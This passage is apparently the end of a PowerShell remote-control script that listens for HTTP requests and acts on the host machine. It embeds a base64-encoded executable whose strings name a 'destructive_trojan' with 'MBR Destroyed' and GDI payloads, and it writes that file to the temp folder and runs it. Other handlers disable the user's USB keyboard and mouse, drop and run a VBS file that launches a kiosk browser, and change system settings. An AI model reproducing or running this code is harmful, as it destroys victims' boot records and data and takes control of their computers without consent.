WV3b3JrQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAR2VuZXJpY0V4ZWN1dGUAZ2RpdGVzdC5leGUATWJyU2l6ZQBTeXN0ZW0uVGhyZWFkaW5nAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcARHJhd1N0cmluZwBPcGVuRXhpc3RpbmcAU3lzdGVtLkRyYXdpbmcAQ3JlYXRlU29saWRCcnVzaABnZXRfV2lkdGgAbldpZHRoAHByb2Nlc3NJbmZvcm1hdGlvbkxlbmd0aABoZ2Rpb2JqAGhibU1hc2sAeE1hc2sAeU1hc2sAR2VuZXJpY0FsbABnZGkzMi5kbGwAa2VybmVsMzIuZGxsAFNoZWxsMzIuZGxsAFVzZXIzMi5kbGwAdXNlcjMyLmRsbABudGRsbC5kbGwAU3lzdGVtAFJhbmRvbQBnZXRfQm90dG9tAGJvdHRvbQBFbnVtAGRlc3RydWN0aXZlX3Ryb2phbgBnZXRfUHJpbWFyeVNjcmVlbgBscE51bWJlck9mQnl0ZXNXcml0dGVuAE1haW4AbGFyZ2VJY29uAERyYXdJY29uAHBpTGFyZ2VWZXJzaW9uAHBpU21hbGxWZXJzaW9uAHByb2Nlc3NJbmZvcm1hdGlvbgBibGVuZEZ1bmN0aW9uAGdldF9Qb3NpdGlvbgBkd0NyZWF0aW9uRGlzcG9zaXRpb24Ac29tZV9pY28AWmVybwBCbGVuZE9wAENyZWF0ZUNvbXBhdGlibGVCaXRtYXAAU2xlZXAAZHdSb3AAZ2V0X1RvcAB0b3AAbnVtYmVyAGxwQnVmZmVyAGNyQ29sb3IAQ3Vyc29yAC5jdG9yAEludFB0cgBHcmFwaGljcwBTeXN0ZW0uRGlhZ25vc3RpY3MAR0RJX3BheWxvYWRzAGdldF9Cb3VuZHMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBkd0ZsYWdzQW5kQXR0cmlidXRlcwBscFNlY3VyaXR5QXR0cmlidXRlcwBCbGVuZEZsYWdzAHNldF9Gb3JtYXRGbGFncwBTdHJpbmdGb3JtYXRGbGFncwBmbGFncwBTeXN0ZW0uV2luZG93cy5Gb3JtcwBhbW91bnRJY29ucwBUZXJuYXJ5UmFzdGVyT3BlcmF0aW9ucwBwcm9jZXNzSW5mb3JtYXRpb25DbGFzcwBkd0Rlc2lyZWRBY2Nlc3MAaFByb2Nlc3MATnRTZXRJbmZvcm1hdGlvblByb2Nlc3MAQWxwaGFGb3JtYXQAU3RyaW5nRm9ybWF0AGZvcm1hdABFeHRyYWN0AEludmFsaWRhdGVSZWN0AG5Cb3R0b21SZWN0AGxwUmVjdABuVG9wUmVjdABuTGVmdFJlY3QAblJpZ2h0UmVjdABEZWxldGVPYmplY3QAaE9iamVjdABTZWxlY3RPYmplY3QAblhMZWZ0AG5ZTGVmdABnZXRfTGVmdABsZWZ0AGdldF9SaWdodABnZXRfSGVpZ2h0AG5IZWlnaHQAcmlnaHQAb3BfSW1wbGljaXQARXhpdABQbGdCbHQAU3RyZXRjaEJsdABQYXRCbHQAQml0Qmx0AEVudmlyb25tZW50AGxwUG9pbnQARm9udABjb3VudABUaHJlYWRTdGFydABuWERlc3QAbllEZXN0AGhkY0Rlc3QAbldpZHRoRGVzdABuWE9yaWdpbkRlc3QAbllPcmlnaW5EZXN0AG5IZWlnaHREZXN0AGdkaXRlc3QATmV4dABnZGlfdGV4dABHZXREZXNrdG9wV2luZG93AEV4dHJhY3RJY29uRXgAaUluZGV4AHkAAAAAAAtFAFIAUgBPAFIAACdTAHkAcwB0AGUAbQAgAGkAcwAgAEMAbwByAHIAdQBwAHQAZQBkAAAbTQBCAFIAIABEAGUAcwB0AHIAbwB5AGUAZAAAB0wAVQBMAAAbUwB5AHMAdABlAG0AIABIAHUAbgBnAC4ALgAAC0EAcgBpAGEAbAAAF3MAaABlAGwAbAAzADIALgBkAGwAbAAAAAAACMkkUETXtECSiYFbRP8JpQAEIAEBCAMgAAEFIAEBEREEIAEBDgYHAxgYEiEFAAESIRgGBwISCBIlBAABAQgFIAIBHBgFIAEBEkkoByEYGBgYGBgYHREQEiUIAggCCAgIESkSLQIIAgIIAggCAgIIAgICAgIGGAQAABEpAyAACAUAARItGAcgAwESIQgIBCABCAgFIAIICAgVBw4YGBgIAgISLR0OEjESNQgIEjkCBSACAQ4MBAAAEWEFIAEBEWEFIAEBEWUMIAYBD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'
    $decodedFile = [System.Convert]::FromBase64String($b64)
    $File7 = "$env:temp/GDI7"+".exe"
    Set-Content -Path $File7 -Value $decodedFile -Encoding Byte
    & $File7
    Write-Output "Done."
    }
    elseif ($ctx.Request.RawUrl -match "^/mini") {     
    $apps = New-Object -ComObject Shell.Application
    $apps.MinimizeAll()
    Write-Output "Done."
    }
    elseif ($ctx.Request.RawUrl -match "^/sound") {     
    Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | Foreach-Object { Start-Sleep -Seconds 3; (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").Play(); }
    Write-Output "Done."
    }
    
    elseif ($ctx.Request.RawUrl -match "^/dark") {     
    $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
    Set-ItemProperty $Theme AppsUseLightTheme -Value 0
    Start-Sleep 1
    Write-Output "Done."
    }
    
    elseif ($ctx.Request.RawUrl -match "^/light") {     
    $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
    Set-ItemProperty $Theme AppsUseLightTheme -Value 1
    Start-Sleep 1
    Write-Output "Done."
    }
    
    elseif ($ctx.Request.RawUrl -match "^/rroll") {     
    $tobat = @'
    Set WshShell = WScript.CreateObject("WScript.Shell")
    WshShell.Run "C:\Windows\System32\scrnsave.scr"
    WshShell.Run "chrome.exe --new-window -kiosk https://www.youtube.com/watch?v=dQw4w9WgXcQ", 1, False
    WScript.Sleep 200
    WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 10
    Write-Output "Done."
    Remove-Item -Path $pth -Force
    Write-Output "Done."
    }
    
    elseif ($ctx.Request.RawUrl -match "^/joke") {     
    Add-Type -AssemblyName System.speech
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Accept", 'text/plain')
    $DadJoke = Invoke-RestMethod -Uri 'https://icanhazdadjoke.com' -Method Get -Headers $headers
    $SpeechSynth.Speak($DadJoke)
    Write-Output "Done."
    }
    
    elseif ($ctx.Request.RawUrl -match "^/inputon") {     
    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
    $PNPKeyboard.Enable()
    sleep 1
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Enable()
    Write-Output "Done."
    }
    
    elseif ($ctx.Request.RawUrl -match "^/inputoff") {     
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Disable()
    sleep 1
    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
    $PNPKeyboard.Disable()
    Write-Output "Done."
}
    }catch [System.Net.HttpListenerException] {Write-Host ($_);}}

#============================================================ CLOSING MESSAGE ====================================================================

Write-Host "Server Stopped!" -ForegroundColor Green
Sleep 1


